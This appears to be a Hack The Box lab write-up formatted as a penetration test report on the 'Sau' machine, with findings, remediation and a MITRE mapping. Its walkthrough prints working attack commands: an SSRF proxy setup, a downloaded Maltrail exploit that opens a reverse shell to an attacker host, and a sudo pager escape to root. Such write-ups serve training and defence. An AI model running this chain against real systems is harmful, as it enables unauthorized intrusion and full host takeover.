# Penetration Test Report — Sau

![Difficulty](https://img.shields.io/badge/difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-Linux-red) ![Focus](https://img.shields.io/badge/focus-SSRF%20%E2%86%92%20Maltrail%20RCE%20%2F%20sudo%20less-lightgrey)

## Executive Summary

An authorized assessment of `target.htb` exploited **CVE-2023-27163**, an SSRF in **Request Baskets 1.2.1**, to reach a filtered internal service. The internal service was **Maltrail v0.53**, vulnerable to unauthenticated OS command injection — providing a reverse shell as `puma`. A sudo rule permitting `systemctl status` combined with systemd ≤245 (CVE-2023-26604, pager escape via `less`) yielded a root shell — full host compromise.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Request Baskets 1.2.1 — SSRF (CVE-2023-27163) | High |
| 2 | Maltrail v0.53 — unauthenticated OS command injection | Critical |
| 3 | Sudo NOPASSWD on `systemctl status` + pager escape (CVE-2023-26604) | Critical |

## Technical Walkthrough

### 1. Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 target.htb | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV target.htb
```

SSH (22); ports 80 and 8338 **filtered**; an HTTP service on **55555** — a **Request Baskets** instance, footer disclosing **version 1.2.1** (vulnerable to CVE-2023-27163, SSRF via `/api/baskets/{name}`).

### 2. SSRF — Reaching the Internal Service

A basket was created and its **Forward URL** set to an attacker listener to confirm the SSRF:

```bash
nc -lnvp 80
curl http://target.htb:55555/<basket-id>   # → request received on our listener
```

The Forward URL was then pointed at `http://127.0.0.1:80` with **Proxy Response** and **Expand Forward Path** enabled — turning the basket into a full proxy to the filtered service. Browsing `http://target.htb:55555/<basket-id>` revealed a **Maltrail v0.53** instance.

### 3. Foothold — Maltrail Unauthenticated RCE

Maltrail v0.53 is vulnerable to unauthenticated OS command injection (public PoC, EDB-51676), executed through the SSRF proxy:

```bash
curl -s https://www.exploit-db.com/download/51676 > exploit.py
nc -lnvp 4444
python3 exploit.py <attacker-ip> 4444 http://target.htb:55555/<basket-id>
```

Reverse shell as `puma`; stabilized with `script /dev/null -c bash`. User flag at `/home/puma`.

### 4. Privilege Escalation — systemctl status + less

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/systemctl status trail.service

systemctl --version   # systemd 245 → CVE-2023-26604
```

`systemd` does not set `LESSSECURE=1`, so the `less` pager permits command execution via `!`. Escalation:

```bash
sudo /usr/bin/systemctl status trail.service
# at the pager prompt:
!/bin/bash
```

Root shell; flag at `/root/root.txt`.

## Remediation

- Upgrade Request Baskets (>1.2.1) and Maltrail; restrict what basket forward URLs may target (egress allowlist).
- Filtered/localhost services are not safe — SSRF turns any public app into a proxy.
- Remove `systemctl status` from sudo rules or set `SYSTEMD_PAGER=`/`LESSSECURE=1`; upgrade systemd.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1190 — Exploit Public-Facing App (SSRF + RCE chain) |
| Execution | T1059 — Command Injection |
| Privilege Escalation | T1548.003 — Sudo abuse (pager escape) |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
